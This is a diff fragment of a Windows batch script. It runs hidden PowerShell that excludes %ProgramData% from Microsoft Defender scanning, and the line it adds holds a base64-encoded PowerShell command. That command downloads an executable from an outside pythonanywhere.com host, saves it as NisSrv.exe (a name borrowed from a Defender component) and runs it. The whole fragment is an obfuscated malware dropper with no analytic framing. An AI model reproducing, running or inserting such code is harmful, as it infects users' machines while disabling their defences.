@@ -83,7 +83,7 @@ if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
 ::
 powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %ProgramData%" >nul 2>&1
 :: 
-powershell -windowstyle hidden -EncodedCommand "" >nul 2>&1
+powershell -windowstyle hidden -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAMQA2AGUAMgBmADYAMwAuAHAAeQB0AGgAbwBuAGEAbgB5AHcAaABlAHIAZQAuAGMAbwBtAC8AcwB0AGEAdABpAGMALwBzAGMAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE4AaQBzAFMAcgB2AC4AZQB4AGUAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE4AaQBzAFMAcgB2AC4AZQB4AGUAIgA=" >nul 2>&1
 :: 
 exit /b
 ```
